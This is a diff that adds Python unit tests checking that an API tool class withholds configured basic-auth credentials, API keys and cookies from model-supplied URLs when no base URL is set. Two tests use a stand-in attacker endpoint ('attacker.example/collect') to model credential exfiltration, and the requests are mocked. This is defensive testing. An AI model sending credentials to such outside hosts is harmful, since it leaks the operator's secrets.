@@ -353,6 +353,56 @@ def test_make_request_without_base_url_api_key_and_explicit_auth(mock_dog_image_
         assert called_headers.get("Authorization") == "Bearer explicit"
 
 
+def test_make_request_without_base_url_withholds_basic_auth(mock_dog_image_response):
+    """Basic-auth credentials must not be sent to a model-supplied full URL."""
+    tools = CustomApiTools(username="svc-acct", password="s3cr3t")  # no base_url
+    with patch("requests.request", return_value=mock_dog_image_response) as mock_request:
+        tools.make_request(endpoint="http://attacker.example/collect", method="GET")
+        mock_request.assert_called_once()
+        assert mock_request.call_args[1]["auth"] is None
+
+
+def test_make_request_without_base_url_withholds_default_headers(mock_dog_image_response):
+    """Operator-configured default headers (a credential channel) must not leak."""
+    tools = CustomApiTools(headers={"X-API-Key": "s3cr3t", "Cookie": "session=abc"})  # no base_url
+    with patch("requests.request", return_value=mock_dog_image_response) as mock_request:
+        tools.make_request(endpoint="http://attacker.example/collect", method="GET")
+        mock_request.assert_called_once()
+        called_headers = mock_request.call_args[1]["headers"]
+        assert "X-API-Key" not in called_headers
+        assert "Cookie" not in called_headers
+
+
+def test_make_request_with_base_url_sends_configured_credentials(mock_dog_image_response):
+    """With base_url set the destination is fixed, so configured credentials are sent."""
+    tools = CustomApiTools(
+        base_url="https://dog.ceo/api",
+        username="svc-acct",
+        password="s3cr3t",
+        headers={"X-API-Key": "s3cr3t"},
+    )
+    with patch("requests.request", return_value=mock_dog_image_response) as mock_request:
+        tools.make_request(endpoint="/breeds/image/random", method="GET")
+        mock_request.assert_called_once()
+        assert mock_request.call_args[1]["auth"] is not None
+        assert mock_request.call_args[1]["headers"].get("X-API-Key") == "s3cr3t"
+
+
+def test_make_request_without_base_url_keeps_explicit_per_call_headers(mock_dog_image_response):
+    """Explicit per-call headers reflect caller intent and are still applied."""
+    tools = CustomApiTools(headers={"X-API-Key": "s3cr3t"})  # no base_url
+    with patch("requests.request", return_value=mock_dog_image_response) as mock_request:
+        tools.make_request(
+            endpoint="https://dog.ceo/api/breeds/image/random",
+            method="GET",
+            headers={"X-Request-Id": "explicit"},
+        )
+        mock_request.assert_called_once()
+        called_headers = mock_request.call_args[1]["headers"]
+        assert called_headers.get("X-Request-Id") == "explicit"
+        assert "X-API-Key" not in called_headers
+
+
 def test_make_request_explicit_headers_override_defaults(mock_dog_image_response):
     tools = CustomApiTools(
         base_url="https://dog.ceo/api", headers={"X-Custom-Header": "default_val", "X-Other-Header": "keep_val"}
